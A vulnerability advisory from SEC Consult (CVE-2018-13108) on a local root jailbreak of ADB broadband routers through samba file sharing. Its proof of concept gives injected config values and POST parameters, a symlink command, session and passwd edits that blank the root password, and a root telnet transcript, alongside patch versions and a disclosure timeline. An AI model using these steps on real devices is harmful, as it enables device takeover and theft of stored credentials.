@@ -1,0 +1,288 @@
+SEC Consult Vulnerability Lab Security Advisory < 20180704-0 >
+=======================================================================
+title: Local root jailbreak via network file sharing flaw
+product: All ADB Broadband Gateways / Routers
+(based on Epicentro platform)
+vulnerable version: Hardware: ADB P.RG AV4202N, DV2210, VV2220, VV5522, etc.
+fixed version: see "Solution" section below
+CVE number: CVE-2018-13108
+impact: critical
+homepage: http://www.adbglobal.com
+found: 2016-06-09
+by: Johannes Greil (Office Vienna)
+SEC Consult Vulnerability Lab
+
+An integrated part of SEC Consult
+Europe | Asia | North America
+
+https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+"ADB creates and delivers the right solutions that enable our customers to
+reduce integration and service delivery challenges to increase ARPU and reduce
+churn. We combine ADB know-how and products with those from a number of third
+party industry leaders to deliver complete solutions that benefit from
+collaborative thinking and best in class technologies."
+
+Source: https://www.adbglobal.com/about-adb/
+
+"Founded in 1995, ADB initially focused on developing and marketing software
+for digital TV processors and expanded its business to the design and
+manufacture of digital TV equipment in 1997. The company sold its first set-top
+box in 1997 and since then has been delivering a number of set-top boxes, and
+Gateway devices, together with advanced software platforms. ADB has sold over
+60 million devices worldwide to cable, satellite, IPTV and broadband operators.
+ADB employs over 500 people, of which 70% are in engineering functions."
+
+Source: https://en.wikipedia.org/wiki/Advanced_Digital_Broadcast
+
+Business recommendation:
+------------------------
+By exploiting the local root vulnerability on affected and unpatched devices
+an attacker is able to gain full access to the device with highest privileges.
+Attackers are able to modify any settings that might have otherwise been
+prohibited by the ISP. It is possible to retrieve all stored user credentials
+(such as VoIP) or SSL private keys. Furthermore, attacks on the internal network
+side of the ISP are possible by using the device as a jump host, depending on
+the internal network security measures.
+
+Network security should not depend on the security of independent devices,
+such as modems. An attacker with root access to such a device can enable
+attacks on connected networks, such as administrative networks managed by the
+ISP or other users.
+
+It is highly recommended by SEC Consult to perform a thorough security review
+by security professionals for this platform. It is assumed that further critical
+vulnerabilities exist within the firmware of this device.
+
+Vulnerability overview/description:
+-----------------------------------
+1) Local root jailbreak via network file sharing flaw (CVE-2018-13108)
+Most ADB devices offer USB ports in order for customers to use them for
+printer or file sharing. In the past, ADB devices have suffered from symlink
+attacks e.g. via FTP server functionality which has been fixed in more recent
+firmware versions.
+
+The "Network File Sharing" feature of current ADB devices via USB uses a samba
+daemon which accesses the USB drive with highest access rights and exports the
+network shares with root user permissions. The default and hardcoded setting
+for the samba daemon within the smb.conf on the device has set "wide links =
+no" which normally disallows gaining access to the root file system of the
+device using symlink attacks via a USB drive.
+
+But an attacker is able to exploit both a web GUI input validation and samba
+configuration file parsing problem which makes it possible to access the root
+file system of the device with root access rights via a manipulated USB drive.
+
+The attacker can then edit various system files, e.g. passwd and session
+information of the web server in order to escalate web GUI privileges and
+start a telnet server and gain full system level shell access as root.
+
+This is a local attack and not possible via remote access vectors as an
+attacker needs to insert a specially crafted USB drive into the device!
+Usually not even the ISPs themselves have direct root access on ADB devices
+hence this attack is quite problematic for further internal attacks.
+
+It is possible to change network routes and attack networks and systems within
+the internal network of the ISP or add backdoors or sniffers to the device.
+
+Furthermore, attackers are able to gain access to all stored credentials,
+such as PPP, wireless, CPE management or VoIP passwords.
+
+Proof of concept:
+-----------------
+1) Local root jailbreak via network file sharing flaw (CVE-2018-13108)
+The samba configuration file (smb.conf) of the ADB devices has set the
+following default settings. All file system operations will be performed
+by the root user as set in the "force user" / "force group" setting of the
+exported share:
+
+[global]
+netbios name = HOSTNAME
+workgroup = WORKGROUP
+wide links = no
+smb ports = 445 139
+security = share
+guest account = root
+announce version = 5.0
+socket options = TCP_NODELAY SO_RCVBUF=65536 SO_SNDBUF=65536
+null passwords = yes
+name resolve order = hosts wins bcast
+wins support = yes
+syslog only = yes
+read only = no
+hosts allow = 192.168.1.1/255.255.255.0
+[share]
+path = /mnt/sdb1/.
+read only = false
+force user = root
+force group = root
+guest ok = yes
+
+An attacker can edit various values such as "netbios name" and "workgroup" via
+the web GUI. The web GUI does some basic filtering and newlines are
+unfortunately not allowed (the samba config file is line-based) hence a
+special bypass has been crafted in order to change the default setting "wide
+links = no" to "wide links = yes". This enables symlinks to the root file
+system.
+
+By using the following netbios name and workgroup, samba can be tricked into
+allowing symlinks to the root file system of the device:
+netbios domain / workgroup = =wide links = yes \ netbios name = wide links = yes 
+Relevant HTTP POST parameters:
+&domainName==wide links = yes \ \ &hostName=wide+links+%3D+yes+%5C
+
+According to the manpage of smb.conf, any line ending in a \ is continued by the
+samba parser on the next line. Furthermore, it states that "Only the first
+equals sign in a parameter is significant." - which it seems can be bypassed
+by adding a backslash \. The parser now thinks that the "wide links = yes" has
+been set and omits the hardcoded "wide links = no" which comes further down
+below in the smb.conf file.
+
+In order to add those special values within the web GUI a proxy server such as
+burp proxy is needed because of basic input validation on the client side (not
+server side).
+
+The USB drive needs to be formatted to ext2 or ext3 which is supported by
+the ADB device. Then create a symlink to the root file system via the
+following command on the attacker's computer:
+ln -s / /path/to/usbdevice/rootfs
+
+After those settings have been changed and the USB drive has been set up,
+the USB drive can be inserted into the ADB device. The USB volume needs to be
+exported (with read/write permissions) as a share via the web GUI. Afterwards
+it can be accessed over the network and the "rootfs" folder example from above
+will give an attacker access to the ADB root file system with "read & write"
+access permissions as root.
+
+Most file systems / partitions on the device are mounted read-only per default,
+but the most important one "/tmp" contains all settings and is mounted writable
+for operations.
+
+The defaut user "admin" usually has little access rights during normal
+operations which can be changed by manipulating the session file of the web
+server within /tmp/ui_session_XXX where XXX is the session id of the currently
+logged on user, e.g. change:
+from: access.dboard/settings/management/telnetserver =|> 2001
+to: access.dboard/settings/management/telnetserver =|> 2220
+etc. (or change all entries for maximum access level)
+
+This way, an attacker can give himself all/highest access permissions within
+the GUI and change all the settings of the device! Hence the telnet or SSH
+server can be started even though they might have been disabled by the ISP.
+Furthermore, the /tmp/passwd file has to be changed in order to allow root
+access via shell/telnet:
+change: root:*:0:0:root:/root:/bin/ash
+to: root::0:0:root:/root:/bin/ash
+
+Now telnet into the device with root and no password.
+Example of an ADB DV2210 device:
+
+Trying $IP...
+Connected to $IP.
+Escape character is '^]'.
+Login root:
+
+BusyBox v1.17.3 (2016-02-11 13:34:33 CET) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+___ ___ ___ ___
+|\__\ /\ \ /\ \ /\ |:| | /::\ \ /::\ \ /::\ |:| | /:/\:\ \ /:/\:\ \ /:/\:\ |:|__|__ /::\~\:\ \ /::\~\:\ \ _\:\~\:\ /::::\__\ /:/\:\ \:\__\ /:/\:\ \:\__\ /\ \:\ \:\__ /:/~~/~ \/__\:\/:/ / \/__\:\/:/ / \:\ \:\ \/__/
+/:/ / \::/ / \::/ / \:\ \:\__ \/__/ /:/ / \/__/ \:\/:/ /
+/:/ / \::/ /
+\/__/ \/__/
+..................................................................
+yet another purposeful solution by A D B Broadband
+..................................................................
+root@$hostname:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@$hostname:~#
+
+Vulnerable / tested versions:
+-----------------------------
+The following devices & firmware have been tested which were the most recent
+versions at the time of discovery.
+
+The firmware versions depend on the ISP / customer of ADB and may vary!
+
+ADB P.RG AV4202N - E_3.3.0, latest firmware version, depending on ISP
+ADB DV 2210 - E_5.3.0, latest firmware version, depending on ISP
+ADB VV 5522 - E_8.3.0, latest firmware version, depending on ISP
+ADB VV 2220 - E_9.0.6, latest firmware version, depending on ISP
+etc.
+
+It has been confirmed by ADB that _all_ their ADB modems / gateways / routers
+based on the Epicentro platform with USB ports and network file sharing
+features are affected by this vulnerability in all firmware versions for all
+their customers (ISPs) at the time of identification of the vulnerability.
+
+Vendor contact timeline:
+------------------------
+2016-06-15: Contacting vendor ADB, exchanging encryption keys & advisory
+Asking about affected devices / firmware, timeline for hotfix
+Fast initial response from ADB providing requested information
+2016-06-16: Asking about other affected devices
+2016-06-17: Resending previous question due to encryption problems
+2016-07-04: Conference call
+2016-07 - 2017-04: Further coordination, waiting for firmware release,
+implementation & rollout phases for their customers
+2018-07-04: Embargo lifted, public release of security advisory
+
+Solution:
+---------
+The firmware versions depend on the ISP / customer of ADB and may vary!
+
+Patch version:
+
+ADB P.RG AV4202N >= E_3.3.2, firmware version depending on ISP
+ADB DV2210 >= E_5.3.2, firmware version depending on ISP
+ADB VV5522 >= E_8.3.2, firmware version depending on ISP
+ADB VV2220 >= E_9.3.2, firmware version depending on ISP
+
+Centro Business 1 >= 7.12.10
+Centro Business 2 >= 8.06.08
+
+etc.
+
+Workaround:
+-----------
+Restrict access to the web interface and only allow trusted users.
+Change any default/weak passwords to strong credentials.
+Don't allow remote access to the web GUI via Internet.
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Europe | Asia | North America
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
+ensures the continued knowledge gain of SEC Consult in the field of network
+and application security to stay ahead of the attacker. The SEC Consult
+Vulnerability Lab supports high-quality penetration testing and the evaluation
+of new offensive and defensive technologies for our customers. Hence our
+customers obtain the most current information about vulnerabilities and valid
+recommendation about the risk profile of new technologies.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://www.sec-consult.com/en/career/index.html
+
+Interested in improving your cyber security with the experts of SEC Consult?
+Contact our local offices https://www.sec-consult.com/en/contact/index.html
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF J. Greil / @2018
